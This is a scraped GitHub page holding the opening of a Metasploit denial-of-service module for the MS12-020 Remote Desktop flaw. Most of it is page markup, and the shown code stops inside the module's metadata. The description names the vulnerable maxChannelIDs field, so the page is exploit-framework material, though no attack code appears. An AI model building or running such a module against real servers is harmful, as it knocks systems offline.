              <a href="/jvazquez-r7/metasploit-framework/tree/2012080801/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="2012080801"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="2012080801">2012080801</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/2012071701/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="2012071701"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="2012071701">2012071701</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/2012071101/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="2012071101"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="2012071101">2012071101</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/2012070401/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="2012070401"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="2012070401">2012070401</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/2012062702/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="2012062702"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="2012062702">2012062702</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/2012062701/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="2012062701"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="2012062701">2012062701</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/2012062001/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="2012062001"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="2012062001">2012062001</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/2012061301/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="2012061301"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="2012061301">2012061301</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/2012060603/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="2012060603"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="2012060603">2012060603</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/2012060601/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="2012060601"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="2012060601">2012060601</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/2012053002/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="2012053002"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="2012053002">2012053002</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/2012052303/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="2012052303"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="2012052303">2012052303</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/2012051603/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="2012051603"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="2012051603">2012051603</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/2012050901/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="2012050901"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="2012050901">2012050901</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/2012050201/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="2012050201"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="2012050201">2012050201</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/2012040401/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="2012040401"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="2012040401">2012040401</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/2012032801/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="2012032801"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="2012032801">2012032801</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/2012032101/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="2012032101"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="2012032101">2012032101</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/2012031401/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="2012031401"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="2012031401">2012031401</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/2012030701/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="2012030701"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="2012030701">2012030701</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/2012022901/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="2012022901"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="2012022901">2012022901</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/4.4.0/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="4.4.0"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="4.4.0">4.4.0</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/4.3.0/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="4.3.0"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="4.3.0">4.3.0</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/4.2-stable/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="4.2-stable"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="4.2-stable">4.2-stable</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/4.2.0/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="4.2.0"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="4.2.0">4.2.0</a>
            </div> <!-- /.select-menu-item -->
        </div>

        <div class="select-menu-no-results">Nothing to show</div>
      </div> <!-- /.select-menu-list -->

    </div> <!-- /.select-menu-modal -->
  </div> <!-- /.select-menu-modal-holder -->
</div> <!-- /.select-menu -->

  <div class="breadcrumb">
    <span class='repo-root js-repo-root'><span itemscope="" itemtype="http://data-vocabulary.org/Breadcrumb"><a href="/jvazquez-r7/metasploit-framework/tree/5dcff47b1efa5359562a28b5717a9f4895185597" data-branch="5dcff47b1efa5359562a28b5717a9f4895185597" data-direction="back" data-pjax="true" itemscope="url" rel="nofollow"><span itemprop="title">metasploit-framework</span></a></span></span><span class="separator"> / </span><span itemscope="" itemtype="http://data-vocabulary.org/Breadcrumb"><a href="/jvazquez-r7/metasploit-framework/tree/5dcff47b1efa5359562a28b5717a9f4895185597/modules" data-branch="5dcff47b1efa5359562a28b5717a9f4895185597" data-direction="back" data-pjax="true" itemscope="url" rel="nofollow"><span itemprop="title">modules</span></a></span><span class="separator"> / </span><span itemscope="" itemtype="http://data-vocabulary.org/Breadcrumb"><a href="/jvazquez-r7/metasploit-framework/tree/5dcff47b1efa5359562a28b5717a9f4895185597/modules/auxiliary" data-branch="5dcff47b1efa5359562a28b5717a9f4895185597" data-direction="back" data-pjax="true" itemscope="url" rel="nofollow"><span itemprop="title">auxiliary</span></a></span><span class="separator"> / </span><span itemscope="" itemtype="http://data-vocabulary.org/Breadcrumb"><a href="/jvazquez-r7/metasploit-framework/tree/5dcff47b1efa5359562a28b5717a9f4895185597/modules/auxiliary/dos" data-branch="5dcff47b1efa5359562a28b5717a9f4895185597" data-direction="back" data-pjax="true" itemscope="url" rel="nofollow"><span itemprop="title">dos</span></a></span><span class="separator"> / </span><span itemscope="" itemtype="http://data-vocabulary.org/Breadcrumb"><a href="/jvazquez-r7/metasploit-framework/tree/5dcff47b1efa5359562a28b5717a9f4895185597/modules/auxiliary/dos/windows" data-branch="5dcff47b1efa5359562a28b5717a9f4895185597" data-direction="back" data-pjax="true" itemscope="url" rel="nofollow"><span itemprop="title">windows</span></a></span><span class="separator"> / </span><span itemscope="" itemtype="http://data-vocabulary.org/Breadcrumb"><a href="/jvazquez-r7/metasploit-framework/tree/5dcff47b1efa5359562a28b5717a9f4895185597/modules/auxiliary/dos/windows/rdp" data-branch="5dcff47b1efa5359562a28b5717a9f4895185597" data-direction="back" data-pjax="true" itemscope="url" rel="nofollow"><span itemprop="title">rdp</span></a></span><span class="separator"> / </span><strong class="final-path">ms12_020_maxchannelids.rb</strong> <span class="js-zeroclipboard minibutton zeroclipboard-button" data-clipboard-text="modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb" data-copied-hint="copied!" title="copy to clipboard"><span class="octicon octicon-clippy"></span></span>
  </div>
</div>



  <div class="commit file-history-tease">
      <img class="main-avatar" height="24" src="https://2.gravatar.com/avatar/a678999a2eafe7744646388645761d90?d=https%3A%2F%2Fidenticons.github.com%2F1bbdf7bcc724cf43874759315e061904.png&amp;s=140" width="24" />
      <span class="author"><a href="/jvazquez-r7" rel="author">jvazquez-r7</a></span>
      <time class="js-relative-date" datetime="2013-10-04T07:19:14-07:00" title="2013-10-04 07:19:14">October 04, 2013</time>
      <div class="commit-title">
          <a href="/jvazquez-r7/metasploit-framework/commit/5dcff47b1efa5359562a28b5717a9f4895185597" class="message" data-pjax="true" title="Add @darknight007's changes to ms12-020 dos">Add</a> <a href="https://github.com/darknight007" class="user-mention">@darknight007</a><a href="/jvazquez-r7/metasploit-framework/commit/5dcff47b1efa5359562a28b5717a9f4895185597" class="message" data-pjax="true" title="Add @darknight007's changes to ms12-020 dos">'s changes to ms12-020 dos</a>
      </div>

      <div class="participation">
        <p class="quickstat"><a href="#blob_contributors_box" rel="facebox"><strong>1</strong> contributor</a></p>
        
      </div>
      <div id="blob_contributors_box" style="display:none">
        <h2 class="facebox-header">Users who have contributed to this file</h2>
        <ul class="facebox-user-list">
          <li class="facebox-user-list-item">
            <img height="24" src="https://0.gravatar.com/avatar/e6db4e6763a0d347247fe87720d5bdd2?d=https%3A%2F%2Fidenticons.github.com%2F2f12d5da956936bb4d2fd3a4a4076ea9.png&amp;s=140" width="24" />
            <a href="/tabassassin">tabassassin</a>
          </li>
        </ul>
      </div>
  </div>

<div id="files" class="bubble">
  <div class="file">
    <div class="meta">
      <div class="info">
        <span class="icon"><b class="octicon octicon-file-text"></b></span>
        <span class="mode" title="File Mode">file</span>
          <span>173 lines (158 sloc)</span>
        <span>5.917 kb</span>
      </div>
      <div class="actions">
        <div class="button-group">
              <a class="minibutton disabled js-entice" href=""
                 data-entice="You must be signed in to make or propose changes">Edit</a>
          <a href="/jvazquez-r7/metasploit-framework/raw/5dcff47b1efa5359562a28b5717a9f4895185597/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb" class="button minibutton " id="raw-url">Raw</a>
            <a href="/jvazquez-r7/metasploit-framework/blame/5dcff47b1efa5359562a28b5717a9f4895185597/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb" class="button minibutton ">Blame</a>
          <a href="/jvazquez-r7/metasploit-framework/commits/5dcff47b1efa5359562a28b5717a9f4895185597/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb" class="button minibutton " rel="nofollow">History</a>
        </div><!-- /.button-group -->
          <a class="minibutton danger empty-icon js-entice" href=""
             data-entice="You must be signed in and on a branch to make or propose changes">
          Delete
        </a>
      </div><!-- /.actions -->

    </div>
        <div class="blob-wrapper data type-ruby js-blob-data">
        <table class="file-code file-diff">
          <tr class="file-code-line">
            <td class="blob-line-nums">
              <span id="L1" rel="#L1">1</span>
<span id="L2" rel="#L2">2</span>
<span id="L3" rel="#L3">3</span>
<span id="L4" rel="#L4">4</span>
<span id="L5" rel="#L5">5</span>
<span id="L6" rel="#L6">6</span>
<span id="L7" rel="#L7">7</span>
<span id="L8" rel="#L8">8</span>
<span id="L9" rel="#L9">9</span>
<span id="L10" rel="#L10">10</span>
<span id="L11" rel="#L11">11</span>
<span id="L12" rel="#L12">12</span>
<span id="L13" rel="#L13">13</span>
<span id="L14" rel="#L14">14</span>
<span id="L15" rel="#L15">15</span>
<span id="L16" rel="#L16">16</span>
<span id="L17" rel="#L17">17</span>
<span id="L18" rel="#L18">18</span>
<span id="L19" rel="#L19">19</span>
<span id="L20" rel="#L20">20</span>
<span id="L21" rel="#L21">21</span>
<span id="L22" rel="#L22">22</span>
<span id="L23" rel="#L23">23</span>
<span id="L24" rel="#L24">24</span>
<span id="L25" rel="#L25">25</span>
<span id="L26" rel="#L26">26</span>
<span id="L27" rel="#L27">27</span>
<span id="L28" rel="#L28">28</span>
<span id="L29" rel="#L29">29</span>
<span id="L30" rel="#L30">30</span>
<span id="L31" rel="#L31">31</span>
<span id="L32" rel="#L32">32</span>
<span id="L33" rel="#L33">33</span>
<span id="L34" rel="#L34">34</span>
<span id="L35" rel="#L35">35</span>
<span id="L36" rel="#L36">36</span>
<span id="L37" rel="#L37">37</span>
<span id="L38" rel="#L38">38</span>
<span id="L39" rel="#L39">39</span>
<span id="L40" rel="#L40">40</span>
<span id="L41" rel="#L41">41</span>
<span id="L42" rel="#L42">42</span>
<span id="L43" rel="#L43">43</span>
<span id="L44" rel="#L44">44</span>
<span id="L45" rel="#L45">45</span>
<span id="L46" rel="#L46">46</span>
<span id="L47" rel="#L47">47</span>
<span id="L48" rel="#L48">48</span>
<span id="L49" rel="#L49">49</span>
<span id="L50" rel="#L50">50</span>
<span id="L51" rel="#L51">51</span>
<span id="L52" rel="#L52">52</span>
<span id="L53" rel="#L53">53</span>
<span id="L54" rel="#L54">54</span>
<span id="L55" rel="#L55">55</span>
<span id="L56" rel="#L56">56</span>
<span id="L57" rel="#L57">57</span>
<span id="L58" rel="#L58">58</span>
<span id="L59" rel="#L59">59</span>
<span id="L60" rel="#L60">60</span>
<span id="L61" rel="#L61">61</span>
<span id="L62" rel="#L62">62</span>
<span id="L63" rel="#L63">63</span>
<span id="L64" rel="#L64">64</span>
<span id="L65" rel="#L65">65</span>
<span id="L66" rel="#L66">66</span>
<span id="L67" rel="#L67">67</span>
<span id="L68" rel="#L68">68</span>
<span id="L69" rel="#L69">69</span>
<span id="L70" rel="#L70">70</span>
<span id="L71" rel="#L71">71</span>
<span id="L72" rel="#L72">72</span>
<span id="L73" rel="#L73">73</span>
<span id="L74" rel="#L74">74</span>
<span id="L75" rel="#L75">75</span>
<span id="L76" rel="#L76">76</span>
<span id="L77" rel="#L77">77</span>
<span id="L78" rel="#L78">78</span>
<span id="L79" rel="#L79">79</span>
<span id="L80" rel="#L80">80</span>
<span id="L81" rel="#L81">81</span>
<span id="L82" rel="#L82">82</span>
<span id="L83" rel="#L83">83</span>
<span id="L84" rel="#L84">84</span>
<span id="L85" rel="#L85">85</span>
<span id="L86" rel="#L86">86</span>
<span id="L87" rel="#L87">87</span>
<span id="L88" rel="#L88">88</span>
<span id="L89" rel="#L89">89</span>
<span id="L90" rel="#L90">90</span>
<span id="L91" rel="#L91">91</span>
<span id="L92" rel="#L92">92</span>
<span id="L93" rel="#L93">93</span>
<span id="L94" rel="#L94">94</span>
<span id="L95" rel="#L95">95</span>
<span id="L96" rel="#L96">96</span>
<span id="L97" rel="#L97">97</span>
<span id="L98" rel="#L98">98</span>
<span id="L99" rel="#L99">99</span>
<span id="L100" rel="#L100">100</span>
<span id="L101" rel="#L101">101</span>
<span id="L102" rel="#L102">102</span>
<span id="L103" rel="#L103">103</span>
<span id="L104" rel="#L104">104</span>
<span id="L105" rel="#L105">105</span>
<span id="L106" rel="#L106">106</span>
<span id="L107" rel="#L107">107</span>
<span id="L108" rel="#L108">108</span>
<span id="L109" rel="#L109">109</span>
<span id="L110" rel="#L110">110</span>
<span id="L111" rel="#L111">111</span>
<span id="L112" rel="#L112">112</span>
<span id="L113" rel="#L113">113</span>
<span id="L114" rel="#L114">114</span>
<span id="L115" rel="#L115">115</span>
<span id="L116" rel="#L116">116</span>
<span id="L117" rel="#L117">117</span>
<span id="L118" rel="#L118">118</span>
<span id="L119" rel="#L119">119</span>
<span id="L120" rel="#L120">120</span>
<span id="L121" rel="#L121">121</span>
<span id="L122" rel="#L122">122</span>
<span id="L123" rel="#L123">123</span>
<span id="L124" rel="#L124">124</span>
<span id="L125" rel="#L125">125</span>
<span id="L126" rel="#L126">126</span>
<span id="L127" rel="#L127">127</span>
<span id="L128" rel="#L128">128</span>
<span id="L129" rel="#L129">129</span>
<span id="L130" rel="#L130">130</span>
<span id="L131" rel="#L131">131</span>
<span id="L132" rel="#L132">132</span>
<span id="L133" rel="#L133">133</span>
<span id="L134" rel="#L134">134</span>
<span id="L135" rel="#L135">135</span>
<span id="L136" rel="#L136">136</span>
<span id="L137" rel="#L137">137</span>
<span id="L138" rel="#L138">138</span>
<span id="L139" rel="#L139">139</span>
<span id="L140" rel="#L140">140</span>
<span id="L141" rel="#L141">141</span>
<span id="L142" rel="#L142">142</span>
<span id="L143" rel="#L143">143</span>
<span id="L144" rel="#L144">144</span>
<span id="L145" rel="#L145">145</span>
<span id="L146" rel="#L146">146</span>
<span id="L147" rel="#L147">147</span>
<span id="L148" rel="#L148">148</span>
<span id="L149" rel="#L149">149</span>
<span id="L150" rel="#L150">150</span>
<span id="L151" rel="#L151">151</span>
<span id="L152" rel="#L152">152</span>
<span id="L153" rel="#L153">153</span>
<span id="L154" rel="#L154">154</span>
<span id="L155" rel="#L155">155</span>
<span id="L156" rel="#L156">156</span>
<span id="L157" rel="#L157">157</span>
<span id="L158" rel="#L158">158</span>
<span id="L159" rel="#L159">159</span>
<span id="L160" rel="#L160">160</span>
<span id="L161" rel="#L161">161</span>
<span id="L162" rel="#L162">162</span>
<span id="L163" rel="#L163">163</span>
<span id="L164" rel="#L164">164</span>
<span id="L165" rel="#L165">165</span>
<span id="L166" rel="#L166">166</span>
<span id="L167" rel="#L167">167</span>
<span id="L168" rel="#L168">168</span>
<span id="L169" rel="#L169">169</span>
<span id="L170" rel="#L170">170</span>
<span id="L171" rel="#L171">171</span>
<span id="L172" rel="#L172">172</span>

            </td>
            <td class="blob-line-code">
                    <div class="highlight"><pre><div class='line' id='LC1'><span class="c1">##</span></div><div class='line' id='LC2'><span class="c1"># This file is part of the Metasploit Framework and may be subject to</span></div><div class='line' id='LC3'><span class="c1"># redistribution and commercial restrictions. Please see the Metasploit</span></div><div class='line' id='LC4'><span class="c1"># Framework web site for more information on licensing and terms of use.</span></div><div class='line' id='LC5'><span class="c1">#   http://metasploit.com/framework/</span></div><div class='line' id='LC6'><span class="c1">##</span></div><div class='line' id='LC7'><br/></div><div class='line' id='LC8'><span class="nb">require</span> <span class="s1">&#39;msf/core&#39;</span></div><div class='line' id='LC9'><br/></div><div class='line' id='LC10'><span class="k">class</span> <span class="nc">Metasploit3</span> <span class="o">&lt;</span> <span class="ss">Msf</span><span class="p">:</span><span class="ss">:Auxiliary</span></div><div class='line' id='LC11'><br/></div><div class='line' id='LC12'>&nbsp;&nbsp;<span class="kp">include</span> <span class="ss">Msf</span><span class="p">:</span><span class="ss">:Auxiliary</span><span class="o">::</span><span class="no">Report</span></div><div class='line' id='LC13'>&nbsp;&nbsp;<span class="kp">include</span> <span class="ss">Msf</span><span class="p">:</span><span class="ss">:Exploit</span><span class="o">::</span><span class="ss">Remote</span><span class="p">:</span><span class="ss">:Tcp</span></div><div class='line' id='LC14'>&nbsp;&nbsp;<span class="kp">include</span> <span class="ss">Msf</span><span class="p">:</span><span class="ss">:Auxiliary</span><span class="o">::</span><span class="no">Dos</span></div><div class='line' id='LC15'><br/></div><div class='line' id='LC16'>&nbsp;&nbsp;<span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="n">info</span> <span class="o">=</span> <span class="p">{})</span></div><div class='line' id='LC17'>&nbsp;&nbsp;&nbsp;&nbsp;<span class="k">super</span><span class="p">(</span><span class="n">update_info</span><span class="p">(</span><span class="n">info</span><span class="p">,</span></div><div class='line' id='LC18'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s1">&#39;Name&#39;</span>           <span class="o">=&gt;</span> <span class="s1">&#39;MS12-020 Microsoft Remote Desktop Use-After-Free DoS&#39;</span><span class="p">,</span></div><div class='line' id='LC19'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s1">&#39;Description&#39;</span>    <span class="o">=&gt;</span> <span class="sx">%q{</span></div><div class='line' id='LC20'><span class="sx">        This module exploits the MS12-020 RDP vulnerability originally discovered and</span></div><div class='line' id='LC21'><span class="sx">        reported by Luigi Auriemma.  The flaw can be found in the way the T.125</span></div><div class='line' id='LC22'><span class="sx">        ConnectMCSPDU packet is handled in the maxChannelIDs field, which will result</span></div><div class='line' id='LC23'><span class="sx">        an invalid pointer being used, therefore causing a denial-of-service condition.</span></div><div class='line' id='LC24'><span class="sx">      }</span><span class="p">,</span></div><div class='line' id='LC25'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s1">&#39;References&#39;</span>     <span class="o">=&gt;</span></div><div class='line' id='LC26'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="o">[</span></div><div class='line' id='LC27'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="o">[</span> <span class="s1">&#39;CVE&#39;</span><span class="p">,</span> <span class="s1">&#39;2012-0002&#39;</span> <span class="o">]</span><span class="p">,</span></div><div class='line' id='LC28'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="o">[</span> <span class="s1">&#39;MSB&#39;</span><span class="p">,</span> <span class="s1">&#39;MS12-020&#39;</span> <span class="o">]</span><span class="p">,</span></div><div class='line' id='LC29'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="o">[</span> <span class="s1">&#39;URL&#39;</span><span class="p">,</span> <span class="s1">&#39;http://www.privatepaste.com/ffe875e04a&#39;</span> <span class="o">]</span><span class="p">,</span></div><div class='line' id='LC30'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="o">[</span> <span class="s1">&#39;URL&#39;</span><span class="p">,</span> <span class="s1">&#39;http://pastie.org/private/4egcqt9nucxnsiksudy5dw&#39;</span> <span class="o">]</span><span class="p">,</span></div><div class='line' id='LC31'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="o">[</span> <span class="s1">&#39;URL&#39;</span><span class="p">,</span> <span class="s1">&#39;http://pastie.org/private/feg8du0e9kfagng4rrg&#39;</span> <span class="o">]</span><span class="p">,</span></div><div class='line' id='LC32'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="o">[</span> <span class="s1">&#39;URL&#39;</span><span class="p">,</span> <span class="s1">&#39;http://stratsec.blogspot.com.au/2012/03/ms12-020-vulnerability-for-breakfast.html&#39;</span> <span class="o">]</span><span class="p">,</span></div><div class='line' id='LC33'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="o">[</span> <span class="s1">&#39;EDB&#39;</span><span class="p">,</span> <span class="s1">&#39;18606&#39;</span> <span class="o">]</span><span class="p">,</span></div><div class='line' id='LC34'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="o">[</span> <span class="s1">&#39;URL&#39;</span><span class="p">,</span> <span class="s1">&#39;https://community.rapid7.com/community/metasploit/blog/2012/03/21/metasploit-update&#39;</span> <span class="o">]</span></div><div class='line' id='LC35'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="o">]</span><span class="p">,</span></div><div class='line' id='LC36'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s1">&#39;Author&#39;</span>         <span class="o">=&gt;</span></div><div class='line' id='LC37'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="o">[</span></div><div class='line' id='LC38'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s1">&#39;Luigi Auriemma&#39;</span><span class="p">,</span></div><div class='line' id='LC39'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="s1">&#39;Daniel 